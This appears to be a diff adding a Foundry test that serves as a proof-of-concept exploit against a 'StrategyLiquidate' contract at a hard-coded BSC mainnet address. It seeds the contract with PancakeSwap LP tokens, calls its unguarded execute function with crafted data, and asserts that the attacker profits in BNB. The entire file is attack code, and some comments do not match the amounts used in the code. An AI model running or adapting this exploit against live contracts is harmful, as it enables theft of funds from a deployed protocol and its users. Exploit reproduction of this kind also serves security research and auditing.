@@ -1,0 +1,170 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Constants for BSC mainnet
+address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
+// Target StrategyLiquidate contract (verified on BSC)
+address constant STRATEGY = 0x5085c49828b0b8e69bae99d96a8e0fcf0a033369;
+
+// Minimal ERC20 for test token
+contract TestERC20 {
+    string public name = "TestToken";
+    string public symbol = "TT";
+    uint8 public decimals = 18;
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+    uint public totalSupply;
+
+    constructor(uint _initialSupply) {
+        balanceOf[msg.sender] = _initialSupply;
+        totalSupply = _initialSupply;
+    }
+
+    function approve(address spender, uint amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+
+    function transfer(address to, uint amount) external returns (bool) {
+        require(balanceOf[msg.sender] >= amount);
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint amount) external returns (bool) {
+        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount);
+        balanceOf[from] -= amount;
+        allowance[from][msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+// Interfaces for PancakeSwap
+interface IUniswapV2Router02 {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB);
+    function swapExactTokensForTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2Pair {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function balanceOf(address owner) external view returns (uint);
+    function transfer(address to, uint value) external returns (bool);
+    function approve(address spender, uint value) external returns (bool);
+}
+
+interface IWETH {
+    function withdraw(uint) external;
+}
+
+interface IStrategyLiquidate {
+    function execute(address user, address borrowToken, uint256 borrow, uint256 debt, bytes calldata data) external payable;
+}
+
+contract ExploitTest is Test {
+    TestERC20 testToken;
+    address lpToken;
+    IUniswapV2Router02 router = IUniswapV2Router02(PANCAKE_ROUTER);
+    IUniswapV2Factory factory = IUniswapV2Factory(PANCAKE_FACTORY);
+
+    function setUp() public {
+        // Label addresses for traces
+        vm.label(STRATEGY, "StrategyLiquidate");
+        vm.label(PANCAKE_ROUTER, "PancakeRouter");
+        vm.label(WBNB, "WBNB");
+
+        // Deploy test token and add liquidity to create a real LP pair
+        testToken = new TestERC20(1_000_000 * 1e18);
+        vm.label(address(testToken), "TestToken");
+
+        // Deal ETH to this contract to fund the liquidity position
+        deal(address(this), 10 ether);
+
+        // Approve the test token for the router
+        testToken.approve(PANCAKE_ROUTER, type(uint256).max);
+
+        // Add liquidity: 1 BNB + 1000 test tokens
+        (,, uint liquidity) = router.addLiquidityETH{value: 2 ether}(
+            address(testToken),
+            2000 * 1e18, // amountTokenDesired
+            0,            // amountTokenMin
+            0,            // amountETHMin
+            address(this),
+            block.timestamp
+        );
+
+        // Get the pair address
+        lpToken = factory.getPair(address(testToken), WBNB);
+        require(lpToken != address(0), "Pair not created");
+        vm.label(lpToken, "LPToken");
+
+        // Transfer half of the LP tokens to the StrategyLiquidate contract
+        IUniswapV2Pair pair = IUniswapV2Pair(lpToken);
+        uint lpBalance = pair.balanceOf(address(this));
+        pair.transfer(STRATEGY, lpBalance / 2);
+    }
+
+    function testForceLiquidationDrain() public {
+        // Record attacker's initial BNB balance (this contract)
+        uint attackerBalBefore = address(this).balance;
+
+        // Prepare call to execute on StrategyLiquidate
+        // borrowToken = address(0) to target BNB (will be mapped to WBNB)
+        // data = abi.encode(lpToken address)
+        bytes memory data = abi.encode(lpToken);
+
+        // Call execute as any user (no access control)
+        IStrategyLiquidate(STRATEGY).execute{value: 0}(
+            address(0), // user (unused)
+            address(0), // borrowToken -> will become WBNB
+            0,          // borrow (unused)
+            0,          // debt (unused)
+            data
+        );
+
+        // Attacker's balance after exploit
+        uint attackerBalAfter = address(this).balance;
+
+        // Assert that the attacker profited (gained at least some BNB from the liquidation)
+        assertGt(attackerBalAfter, attackerBalBefore, "Attacker did not gain BNB");
+
+        // Optional: log profit
+        emit log_named_decimal_uint("Profit (BNB)", attackerBalAfter - attackerBalBefore, 18);
+    }
+}
+```
